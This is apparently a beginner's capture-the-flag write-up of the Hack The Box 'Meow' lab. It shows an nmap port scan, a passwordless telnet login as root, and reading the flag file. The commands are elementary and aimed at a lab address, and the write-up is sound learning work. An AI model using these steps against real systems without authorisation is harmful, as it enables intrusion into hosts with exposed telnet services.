# Meow

### Overview

- Platform: Linux
- Difficulty: Very Easy
- Completed: August 3, 2026

---

### Objective

Gain access to the target machine and capture the flag.

---

### Enumeration

Nmap Scan

```bash
nmap 10.129.225.148
```

Results:

- Port TCP/23 open
- Telnet service detected

---

### Exploitation

Connected using Telnet.

```bash
telnet 10.129.225.148
```

Username:

```text
root
```

Successfully obtained a root shell.

---


### Flag

```bash
cat /root/flag.txt
```

Flag captured successfully.

---

### What I Learned

- Every HTB machine starts with the target IP address.
- Nmap is the first tool I should use to identify open ports and services.
- Service enumeration tells me what attack surface is available.

---

### Tools Used

- Nmap
- Telnet

---

### Commands Used

```bash
- ping 10.129.225.148
- nmap 10.129.225.148
- telnet 10.129.225.148
- cat /root/flag.txt
```
